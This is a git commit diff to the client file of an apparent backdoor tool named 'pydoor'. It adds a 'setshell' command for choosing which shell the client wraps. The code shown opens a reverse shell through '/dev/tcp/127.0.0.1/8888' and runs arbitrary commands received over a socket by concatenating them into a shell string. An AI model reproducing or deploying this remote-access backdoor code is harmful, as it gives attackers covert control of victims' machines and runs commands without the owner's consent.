ad34d6a1cee2bee1e06f5dd1ea205992dbd42ab3
solirs <zcauchemar@gmail.com>
2022-01-26 21:28:26 +0100

    ADD: Setshell command to change wrapped shell in the default shell

--- client/client.py
+++ client/client.py
@@ -14,38 +14,59 @@ class Client:
         self.sock = 0
         self.cmd = 0
         self.shell = "/bin/sh"
+        self.args = 0
 
 
     def checkbash(self):
         
         try:
 
-            subprocess.call(["bash","--help"],stderr=subprocess.STDOUT, stdout=subprocess.DEVNULL)
+            subprocess.run(["bash","--help"],stderr=subprocess.STDOUT, stdout=subprocess.DEVNULL)
             self.shell = "/bin/bash"
             print("Shell is bash")
         except:
             print("Shell is not bash")
             pass
 
+    def checkinstall(self, prog):
+        try:
 
+            subprocess.call([prog, "--help"],stderr=subprocess.STDOUT, stdout=subprocess.DEVNULL)
+            print("shell installed")
+            return True
+        except:
+            return False
 
+    def argumentize(self):
+        self.args = self.cmd.split()
+        print(self.cmd[1])
 
 
     def processcmd(self):
 
+
         if self.cmd:
             print(self.cmd)
+            self.argumentize()
+            #print(self.args[0])
 
-            if self.cmd == "shell":
+            if self.args[0] == "shell":
                 subprocess.run([self.shell + " -i >& /dev/tcp/127.0.0.1/8888 0>&1"], shell=True)
-            elif self.cmd == "quit":
+            elif self.args[0] == "quit":
                 self.sock.send(b"pydoor.quit")
                 sys.exit(0)
-            elif self.cmd == "sleep":
+            elif self.args[0] == "sleep":
                 self.sock.send(b"pydoor.quit")
                 time.sleep(1) #Temporary solution
                 self.sock.close()
                 self.start()
+            elif self.args[0] == "setshell":
+                
+                if self.checkinstall(self.args[1]):
+                    self.shell = self.args[1]
+                    self.sock.send(b"Shell successfully changed to" + self.shell.encode())
+                
+
             
             else:
                 j = subprocess.getoutput(self.shell + " -c '" + self.cmd + "'")
